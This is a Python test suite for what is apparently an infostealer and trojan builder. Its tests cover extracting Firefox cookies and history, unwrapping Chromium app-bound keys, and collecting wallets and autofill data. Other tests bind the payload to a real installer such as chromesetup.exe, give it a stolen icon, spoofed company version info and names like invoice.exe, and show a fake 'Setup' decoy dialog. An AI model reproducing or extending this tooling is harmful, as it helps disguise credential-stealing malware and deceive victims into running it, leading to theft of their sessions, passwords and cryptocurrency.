    monkeypatch.setattr(
        registry.importlib,
        "import_module",
        lambda name, package=None: SimpleNamespace(run=lambda *a, **k: 1),
    )

    counts, failures = registry.run_all(tmp_path, registry_config())

    assert failures == {}
    assert set(counts) == {
        "system",
        "network",
        "displays",
        "browsers",
        "sessions",
        "wallets",
        "autofill",
        "documents",
    }


# --- gecko without a key4.db --------------------------------------------------


def firefox_profile(profile: Path) -> None:
    """A profile with a cookie jar and a places database, and no login store."""
    profile.mkdir(parents=True)

    cookies = sqlite3.connect(str(profile / "cookies.sqlite"))
    cookies.execute(
        "CREATE TABLE moz_cookies (name TEXT, value TEXT, host TEXT, path TEXT, "
        "expiry INTEGER, lastAccessed INTEGER, isSecure INTEGER, isHttpOnly INTEGER, "
        "sameSite INTEGER)"
    )
    cookies.execute(
        "INSERT INTO moz_cookies VALUES (?,?,?,?,?,?,?,?,?)",
        ("sid", "abc123", ".example.com", "/", 1900000000, 1700000000000000, 1, 1, 0),
    )
    cookies.commit()
    cookies.close()

    places = sqlite3.connect(str(profile / "places.sqlite"))
    places.execute(
        "CREATE TABLE moz_places (url TEXT, title TEXT, visit_count INTEGER, "
        "typed INTEGER, last_visit_date INTEGER)"
    )
    places.execute(
        "INSERT INTO moz_places VALUES (?,?,?,?,?)",
        ("https://example.com/login", "Example", 12, 3, 1700000000000000),
    )
    places.commit()
    places.close()


def test_firefox_collects_cookies_and_history_without_a_key(tmp_path: Path) -> None:
    # A profile with a master password has no readable logins and a perfectly readable
    # cookie jar. Returning early on the failed unwrap threw both databases away, which
    # made a Firefox-only machine look empty.
    from agent.sources.browsers import gecko

    profile = tmp_path / "Profiles" / "abc.default"
    firefox_profile(profile)
    target = tmp_path / "out"

    assert gecko.run_profile(profile, target) == 2

    cookies = json.loads((target / "cookies.json").read_text(encoding="utf-8"))
    assert cookies[0]["host"] == ".example.com"
    assert cookies[0]["value"] == "abc123"
    assert cookies[0]["secure"] is True
    assert cookies[0]["expires"].startswith("2030-")

    history = json.loads((target / "history.json").read_text(encoding="utf-8"))
    assert history[0]["url"] == "https://example.com/login"
    assert history[0]["visits"] == 12
    assert history[0]["last_visit"].startswith("2023-")

    assert not (target / "passwords.json").exists()


def test_firefox_with_nothing_to_read_writes_nothing(tmp_path: Path) -> None:
    from agent.sources.browsers import gecko

    profile = tmp_path / "empty"
    profile.mkdir()
    target = tmp_path / "out"

    assert gecko.run_profile(profile, target) == 0
    assert not target.exists() or not any(target.iterdir())


# --- the icon ----------------------------------------------------------------

LAUNCHER = ROOT / "tools" / "dist" / "sable-launcher.exe"


def pe_image(sections: list[tuple[int, int]], *, headers: int = 0x200) -> bytes:
    """A file with a real PE header: DOS pointer, COFF, optional header, sections."""
    optional_size = 0xE0
    pointer = 0x40
    coff = pointer + 4
    optional = coff + 20
    table = optional + optional_size

    end = headers
    for offset, size in sections:
        end = max(end, offset + size)

    data = bytearray(max(end, headers))
    data[:2] = b"MZ"
    struct.pack_into("<I", data, 0x3C, pointer)
    data[pointer:pointer + 4] = b"PE\0\0"
    struct.pack_into("<H", data, coff + 2, len(sections))
    struct.pack_into("<H", data, coff + 16, optional_size)
    struct.pack_into("<I", data, optional + 60, headers)
    for index, (offset, size) in enumerate(sections):
        base = table + index * 40
        struct.pack_into("<II", data, base + 16, size, offset)
    return bytes(data)


def ico(images: list[bytes]) -> bytes:
    """A single-library ``.ico`` carrying the images given."""
    table = b""
    offset = 6 + 16 * len(images)
    for image in images:
        table += struct.pack("<BBBBHHII", 16, 16, 0, 0, 1, 32, len(image), offset)
        offset += len(image)
    return struct.pack("<HHH", 0, 1, len(images)) + table + b"".join(images)


def test_the_image_ends_where_the_appended_archive_starts() -> None:
    # The launcher is a PE image with a PyInstaller archive welded to its tail. A
    # resource update rewrites the image and drops the tail, so the boundary has to be
    # measured before the patch — this is the measurement.
    image = pe_image([(0x200, 0x400), (0x600, 0x200)], headers=0x200)
    overlay = b"MEI\x0c\x0b\x0a\x0b\x0e" + bytes(64)
    assert forge.image_end(image + overlay) == 0x800


def test_the_image_end_never_lands_inside_the_headers() -> None:
    image = pe_image([(0x400, 0x20)], headers=0x1000)
    assert forge.image_end(image + b"tail") == 0x1000


def test_something_that_is_not_a_pe_is_refused_rather_than_measured() -> None:
    with pytest.raises(forge.ForgeError):
        forge.image_end(b"MZ" + bytes(0x100))
    with pytest.raises(forge.ForgeError):
        forge.image_end(b"PK\x03\x04" + bytes(0x100))


def test_an_ico_is_read_into_the_images_it_carries() -> None:
    entries = forge._icon_entries(ico([bytes(64), bytes(256)]))

    assert [len(item.data) for item in entries] == [64, 256]
    assert [(item.width, item.height, item.bit_count) for item in entries] == [
        (16, 16, 32),
        (16, 16, 32),
    ]


def test_the_group_resource_names_every_image_by_the_id_it_is_filed_under() -> None:
    entries = forge._icon_entries(ico([bytes(64), bytes(256)]))
    group = forge.group_payload(entries)

    assert len(group) == 6 + 2 * 14
    assert group[:6] == struct.pack("<HHH", 0, 1, 2)
    assert group[6:10] == bytes([16, 16, 0, 0])
    assert struct.unpack_from("<I", group, 6 + 8)[0] == 64
    assert struct.unpack_from("<H", group, 6 + 12)[0] == 1
    assert struct.unpack_from("<I", group, 6 + 14 + 8)[0] == 256
    assert struct.unpack_from("<H", group, 6 + 14 + 12)[0] == 2


@pytest.mark.parametrize(
    "raw",
    [
        b"",
        b"\x00\x00\x01",
        struct.pack("<HHH", 1, 1, 1),
        struct.pack("<HHH", 0, 2, 1),
        struct.pack("<HHH", 0, 1, 0),
        struct.pack("<HHH", 0, 1, 1) + struct.pack("<BBBBHHII", 16, 16, 0, 0, 1, 32, 32, 999),
    ],
)
def test_an_icon_that_is_not_one_is_refused(raw: bytes) -> None:
    with pytest.raises(forge.ForgeError):
        forge._icon_entries(raw)


@pytest.mark.skipif(
    not LAUNCHER.is_file(),
    reason="the launcher has not been built in this tree",
)
@needs_crypto
def test_an_icon_grows_the_launcher_and_the_footer_follows(tmp_path: Path) -> None:
    # The proof that the patch is real: the stub changes size, the offset the footer
    # records follows it, and the PyInstaller archive is still welded to the tail.
    # Without the re-append the artifact is a 360 KB exe that boots nothing.
    icon = tmp_path / "mark.ico"
    icon.write_bytes(ico([bytes(64), bytes(256)]))

    data = forge.payload(ROOT, config())
    built = forge.build(
        config(),
        seal.seal(data, SEAL_KEY),
        tmp_path / "marked.exe",
        mode="exe",
        stub=LAUNCHER,
        icon=icon,
    )

    raw = built.read_bytes()
    offset = int.from_bytes(raw[-forge.FOOTER_SIZE + 4:], "little")

    # Ballast is zero, so the footer's offset is the patched stub's size. It is not the
    # launcher's size — measured, Windows rebuilds the resource section and the rebuilt
    # one is smaller than the bootloader's icon set it replaced. Under or over does not
    # matter; what matters is that the offset describes the file that was actually
    # written.
    original = LAUNCHER.read_bytes()
    assert offset != len(original), "the icon did not change the launcher"
    assert raw[offset - 64:offset] == original[-64:], "the appended archive did not survive"

    # Not "an icon is present" — these exact bytes are the group resource we asked for,
    # and resource data is stored raw, so the group we built is the group the file has.
    assert forge.group_payload(forge.icon_entries(icon)) in raw

    header = loader._read_trailer(built)
    assert header.seal_key == SEAL_KEY
    assert loader._open_sealed(loader._read_sealed(built, offset), header.seal_key) == data


def test_an_icon_is_a_note_on_script_output(tmp_path: Path) -> None:
    icon = tmp_path / "mark.ico"
    icon.write_bytes(ico([bytes(16)]))

    problems = validate_module.validate(config(), mode=forge.OUTPUT_PY, icon=icon)

    assert [problem.blocking for problem in problems] == [False]
    assert problems[0].path == "output.icon"


def test_a_png_renamed_to_ico_is_refused_before_the_build_starts(tmp_path: Path) -> None:
    fake = tmp_path / "mark.ico"
    fake.write_bytes(b"\x89PNG\r\n\x1a\n" + bytes(64))

    problems = validate_module.validate(config(), mode=forge.OUTPUT_PY, icon=fake)

    assert validate_module.blocking(problems)
    assert problems[0].path == "output.icon"
    assert "not a .ico" in problems[0].message


# --- the bound file ----------------------------------------------------------


def test_a_bound_file_travels_inside_the_payload(tmp_path: Path) -> None:
    bound = tmp_path / "install.exe"
    bound.write_bytes(b"MZ" + bytes(32))

    data = forge.payload(ROOT, config(), fuse=bound)

    with zipfile.ZipFile(io.BytesIO(data)) as archive:
        assert archive.read("fused/install.exe") == bound.read_bytes()


def test_a_payload_without_a_bound_file_carries_none() -> None:
    data = forge.payload(ROOT, config())

    with zipfile.ZipFile(io.BytesIO(data)) as archive:
        assert not [name for name in archive.namelist() if name.startswith("fused/")]


def test_the_payload_refuses_a_bound_file_it_cannot_carry(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    empty = tmp_path / "empty.exe"
    empty.write_bytes(b"")
    with pytest.raises(forge.ForgeError):
        forge.payload(ROOT, config(), fuse=empty)

    monkeypatch.setattr(forge, "MAX_FUSE_BYTES", 8)
    heavy = tmp_path / "heavy.exe"
    heavy.write_bytes(b"M" * 16)
    with pytest.raises(forge.ForgeError):
        forge.payload(ROOT, config(), fuse=heavy)


def test_both_halves_agree_on_the_prefix_and_what_can_be_started() -> None:
    # core/ cannot import agent/ and agent/ cannot import core/, so the two constants
    # are declared twice on purpose. This is the pin that keeps them equal.
    assert forge.FUSE_PREFIX == entry.FUSE_PREFIX
    assert forge.BOUND_SUFFIXES == entry.BOUND_SUFFIXES


def test_a_bound_file_is_extracted_beside_its_neighbours_and_started(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    archive_path = tmp_path / "payload.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("fused/tool.exe", b"MZ" + bytes(32))
        archive.writestr("fused/tool.dll", b"MZ" + bytes(8))
        archive.writestr("agent/entry.py", b"")
        archive.writestr("cfg.json", b"{}")

    spawned: list[tuple[list[str], dict[str, object]]] = []

    def fake_popen(command: list[str], **kwargs: object) -> object:
        spawned.append((command, kwargs))
        return object()

    monkeypatch.setattr(entry.subprocess, "Popen", fake_popen)

    with zipfile.ZipFile(archive_path) as archive:
        assert entry._start_bound(archive) == 1

    assert len(spawned) == 1, "a .dll is carried, not started"
    command, options = spawned[0]
    assert command[0].endswith("tool.exe")
    assert options["creationflags"] == entry._DETACHED_PROCESS
    assert Path(command[0]).is_file()
    assert Path(command[0]).with_name("tool.dll").is_file()


def test_nothing_bound_means_nothing_started(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    archive_path = tmp_path / "payload.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("agent/entry.py", b"")

    def forbidden(*_: object, **__: object) -> object:
        raise AssertionError("nothing was bound, so nothing should start")

    monkeypatch.setattr(entry.subprocess, "Popen", forbidden)

    with zipfile.ZipFile(archive_path) as archive:
        assert entry._start_bound(archive) == 0


def test_a_bound_file_over_the_ceiling_is_skipped_rather_than_read(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    archive_path = tmp_path / "payload.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("fused/huge.exe", b"MZ" + bytes(4096))

    spawned: list[object] = []
    monkeypatch.setattr(entry.subprocess, "Popen", lambda *a, **k: spawned.append(a))
    monkeypatch.setattr(entry, "_MAX_BOUND_BYTES", 64)

    with zipfile.ZipFile(archive_path) as archive:
        assert entry._start_bound(archive) == 0
    assert not spawned


def test_a_launcher_that_does_not_start_is_not_a_dead_run(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    archive_path = tmp_path / "payload.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("fused/tool.exe", b"MZ" + bytes(32))

    def refused(*_: object, **__: object) -> object:
        raise OSError("no such file")

    monkeypatch.setattr(entry.subprocess, "Popen", refused)

    with zipfile.ZipFile(archive_path) as archive:
        assert entry._start_bound(archive) == 0


def test_a_bound_file_that_cannot_start_is_a_note(tmp_path: Path) -> None:
    library = tmp_path / "payload.dll"
    library.write_bytes(b"MZ" + bytes(8))

    problems = validate_module.validate(config(), mode=forge.OUTPUT_PY, fuse=library)

    assert [problem.blocking for problem in problems] == [False]
    assert problems[0].path == "output.fuse"
    assert "not started" in problems[0].message


def test_a_bound_file_that_is_not_there_blocks(tmp_path: Path) -> None:
    problems = validate_module.validate(
        config(), mode=forge.OUTPUT_PY, fuse=tmp_path / "gone.exe"
    )

    assert validate_module.blocking(problems)
    assert problems[0].path == "output.fuse"


# --- the disguise -------------------------------------------------------------
#
# The binder has two jobs beyond welding a payload on: the file has to carry the icon
# it was given, and it has to arrive called what the operator called the file it is
# carrying. Both were wrong in V1, and both are pinned here.


def test_the_artifact_is_named_after_the_bound_file(tmp_path: Path) -> None:
    # A build carrying chromesetup.exe arrives as chromesetup.exe. The random name is
    # for a build with nothing better to go on, not a default.
    bound = tmp_path / "chromesetup.exe"
    bound.write_bytes(b"MZ" + bytes(64))

    assert pipeline._artifact_name(None, bound, forge.OUTPUT_EXE) == "chromesetup.exe"


def test_a_typed_name_beats_the_bound_file(tmp_path: Path) -> None:
    bound = tmp_path / "chromesetup.exe"
    bound.write_bytes(b"MZ" + bytes(64))

    assert pipeline._artifact_name("invoice.exe", bound, forge.OUTPUT_EXE) == "invoice.exe"
    assert pipeline._artifact_name("invoice", bound, forge.OUTPUT_EXE) == "invoice.exe"


def test_a_build_with_no_bound_file_still_generates_a_name() -> None:
    assert pipeline._artifact_name(None, None, forge.OUTPUT_EXE) is None


def test_a_bound_name_that_is_not_legal_falls_back_rather_than_stopping(
    tmp_path: Path,
) -> None:
    # The build is good; the name a file happens to have is not a reason to lose it.
    # ``...exe`` has a stem of ``..``, which sanitises to nothing.
    weird = tmp_path / "...exe"
    weird.write_bytes(b"MZ")

    assert pipeline._artifact_name(None, weird, forge.OUTPUT_EXE) is None


def test_derive_keeps_the_stem_and_forces_one_suffix() -> None:
    assert rename.derive("chromesetup.exe") == "chromesetup.exe"
    assert rename.derive("chrome setup 2.exe") == "chrome setup 2.exe"
    assert rename.derive("setup", ".py") == "setup.py"
    with pytest.raises(rename.RenameError):
        rename.derive("")


def test_the_decoy_settings_travel_in_the_config_that_ships() -> None:
    # cfg.json is what the agent reads. A disguise that never reaches it is a form
    # field and nothing else.
    cfg = config(
        version=VersionConfig(company="Northline", file_version="6.2.9.441"),
        decoy_seconds=30,
        decoy_title="Setup",
        decoy_text="Preparing",
    )
    carried = from_dict(json.loads(json.dumps(to_dict(cfg))))

    assert carried.version.company == "Northline"
    assert carried.version.file_version == "6.2.9.441"
    assert (carried.decoy_seconds, carried.decoy_title) == (30, "Setup")


def test_a_version_string_is_four_numbers_that_fit_in_sixteen_bits() -> None:
    assert forge.version_parts("1.2.3.4") == ((1 << 16) | 2, (3 << 16) | 4)
    assert forge.version_parts("65535.65535.65535.65535") == (0xFFFFFFFF, 0xFFFFFFFF)

    for bad in ("1.2.3", "1.2.3.4.5", "1.2.3.x", "1.2.3.65536", "-1.2.3.4", ""):
        with pytest.raises(forge.ForgeError):
            forge.version_parts(bad)


def test_a_version_block_carries_the_signature_and_every_string() -> None:
    blob = forge.version_blob(
        VersionConfig(
            company="Northline Software Ltd",
            product="Northline Setup",
            description="Setup loader",
            copyright="(c) 2026 Northline",
            original_name="northline-setup.exe",
            file_version="6.2.9.441",
        )
    )

    # The block starts with its own length, then the key, then the fixed info. The
    # signature is at a known offset because the key is a fixed string.
    length, value_length, value_type = struct.unpack_from("<HHH", blob, 0)
    assert length == len(blob)
    assert value_type == 0
    assert value_length == 52

    fixed = 6 + len("VS_VERSION_INFO\0".encode("utf-16le"))
    fixed += (4 - fixed % 4) % 4
    assert struct.unpack_from("<I", blob, fixed)[0] == 0xFEEF04BD
    ms, ls = struct.unpack_from("<II", blob, fixed + 8)
    assert (ms >> 16, ms & 0xFFFF, ls >> 16, ls & 0xFFFF) == (6, 2, 9, 441)

    for text in ("Northline Software Ltd", "Northline Setup", "(c) 2026 Northline"):
        assert (text + "\0").encode("utf-16le") in blob


def test_a_version_block_with_nothing_in_it_is_absent_rather_than_empty() -> None:
    assert forge.version_blob(VersionConfig()) == b""


def test_a_version_block_that_is_too_large_is_refused() -> None:
    with pytest.raises(forge.ForgeError):
        forge.version_blob(
            VersionConfig(company="c" * (forge.MAX_VERSION_BYTES), file_version="1.0.0.0")
        )


@pytest.mark.parametrize(
    ("version", "path"),
    [
        (VersionConfig(file_version="1.2.3"), "output.version.file_version"),
        (VersionConfig(product_version="1.2.3.70000"), "output.version.product_version"),
        (VersionConfig(company="a" * 300), "output.version.company"),
        (VersionConfig(copyright="bad\x07bell"), "output.version.copyright"),
    ],
)
def test_a_version_that_would_not_render_is_blocked_at_the_form(
    version: VersionConfig, path: str
) -> None:
    problems = validate_module.validate(config(version=version), mode=forge.OUTPUT_EXE)

    assert validate_module.blocking(problems)
    # The launcher is not part of what this is testing; an exe build with no stub is a
    # second blocking problem and filtering it keeps the assertion about one field.
    assert [problem.path for problem in problems if problem.path != "output.stub"] == [path]


def test_a_version_on_a_script_build_is_a_note() -> None:
    problems = validate_module.validate(
        config(version=VersionConfig(company="Northline")), mode=forge.OUTPUT_PY
    )

    assert [problem.blocking for problem in problems] == [False]
    assert problems[0].path == "output.version"


@pytest.mark.parametrize("seconds", [-1, 601])
def test_a_decoy_outside_its_window_is_blocked(seconds: int) -> None:
    problems = validate_module.validate(
        config(decoy_seconds=seconds, decoy_title="Setup", decoy_text="Preparing"),
        mode=forge.OUTPUT_EXE,
    )

    assert validate_module.blocking(problems)
    assert problems[0].path == "output.decoy.seconds"


def test_a_decoy_with_no_text_is_an_empty_box_and_is_blocked() -> None:
    problems = validate_module.validate(
        config(decoy_seconds=10), mode=forge.OUTPUT_EXE
    )

    assert validate_module.blocking(problems)
    assert problems[0].path == "output.decoy.title"


def test_zero_seconds_is_off_rather_than_a_zero_length_dialog() -> None:
    problems = validate_module.validate(config(decoy_seconds=0), mode=forge.OUTPUT_EXE)

    assert [problem for problem in problems if problem.path != "output.stub"] == []


def test_the_decoy_bounds_are_the_same_number_on_both_sides() -> None:
    # schema decides what a form may hold; the agent re-checks at runtime because the
    # values arrive from an archive. One number, declared twice, pinned here.
    from agent import decoy

    assert decoy.MAX_DECOY_SECONDS == schema.MAX_DECOY_SECONDS
    assert decoy.MAX_DECOY_TEXT == schema.MAX_DECOY_TEXT


def test_the_helper_flag_is_the_same_string_on_both_sides() -> None:
    # loader has to know the flag before the payload exists, and the payload is where
    # abe lives. One string, declared twice, pinned here.
    from agent import abe

    assert loader.HELPER_FLAG == abe.UNWRAP_FLAG


def test_the_helper_is_not_treated_as_a_second_instance(monkeypatch: pytest.MonkeyPatch) -> None:
    # The whole app-bound key depends on this. The running agent holds the mutex; the
    # helper re-execs the same image and would be refused as a duplicate before it read
    # its flag, which reads as "brave has no passwords" rather than "the unwrap died".
    monkeypatch.setattr(loader, "acquire", lambda *args: False)

    assert loader._guarded(["agent.exe", loader.HELPER_FLAG, "C:/temp/s1"]) is True
    assert loader._guarded(["agent.exe"]) is False


def test_a_decoy_of_zero_seconds_starts_no_thread() -> None:
    from agent import decoy

    assert decoy.start("Setup", "Preparing", 0) is None
    assert decoy.show("Setup", "Preparing", 0) is False


@pytest.mark.skipif(not LAUNCHER.is_file(), reason="the launcher has not been built")
def test_the_launcher_resource_table_is_read_before_it_is_written() -> None:
    refs = forge.resource_refs(LAUNCHER.read_bytes())

    kinds = {ref.kind for ref in refs}
    assert 3 in kinds and 14 in kinds
    groups = {ref.identifier for ref in refs if ref.kind == 14}
    # The binder reads this instead of assuming 1: a stub whose icon lives anywhere
    # else gets a second group when the id is assumed, and the shell picks.
    assert len(groups) == 1
    assert all(ref.language >= 0 for ref in refs)


def test_patching_nothing_is_refused_rather_than_writing_an_empty_cycle() -> None:
    with pytest.raises(forge.ForgeError):
        forge.patch_resources(Path("nowhere.exe"))
    with pytest.raises(forge.ForgeError):
        forge.patch_resources(Path("nowhere.exe"), icons=[])
